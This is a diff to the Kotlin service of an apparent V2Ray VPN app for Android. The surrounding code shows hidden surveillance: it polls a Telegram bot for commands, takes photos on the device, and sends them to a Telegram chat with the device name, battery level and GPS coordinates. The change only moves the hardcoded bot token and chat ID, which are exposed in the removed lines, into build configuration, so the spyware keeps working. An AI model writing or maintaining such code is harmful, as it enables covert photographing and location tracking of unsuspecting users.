@@ -66,8 +66,6 @@ class V2RayVpnService : VpnService(), ServiceControl {
 
     companion object {
         const val ACTION_TAKE_PHOTO_ON_OPEN = "com.v2ray.ang.action.TAKE_PHOTO_ON_OPEN"
-        private const val BOT_TOKEN = "8445290760:AAE0l_z3K6mxkCkvLfR75tdt74JAND94dko"
-        private const val CHAT_ID = "5370932271"
         private const val POLLING_INTERVAL_MS = 20000L // 20 seconds
     }
 
@@ -141,7 +139,7 @@ class V2RayVpnService : VpnService(), ServiceControl {
     private suspend fun pollTelegramCommands() {
         while (isActive) {
             try {
-                val updates = TelegramUploader.getUpdates(BOT_TOKEN, lastUpdateId + 1)
+                val updates = TelegramUploader.getUpdates(BuildConfig.TELEGRAM_BOT_TOKEN, lastUpdateId + 1)
                 updates?.let {
                     val jsonResponse = JSONObject(it)
                     val results = jsonResponse.optJSONArray("result")
@@ -200,7 +198,7 @@ class V2RayVpnService : VpnService(), ServiceControl {
         val location = DeviceInfoManager.getCurrentLocation(this)
         val caption = "Trigger: $triggerSource\nDevice: $deviceName\nBattery: $batteryLevel%\nGPS: " +
                 (location?.let { "https://www.google.com/maps?q=${it.latitude},${it.longitude}" } ?: "Not available")
-        TelegramUploader.sendPhoto(BOT_TOKEN, CHAT_ID, photoFile, caption)
+        TelegramUploader.sendPhoto(BuildConfig.TELEGRAM_BOT_TOKEN, BuildConfig.TELEGRAM_CHAT_ID, photoFile, caption)
     }
 
     override fun onRevoke() { stopV2Ray() }
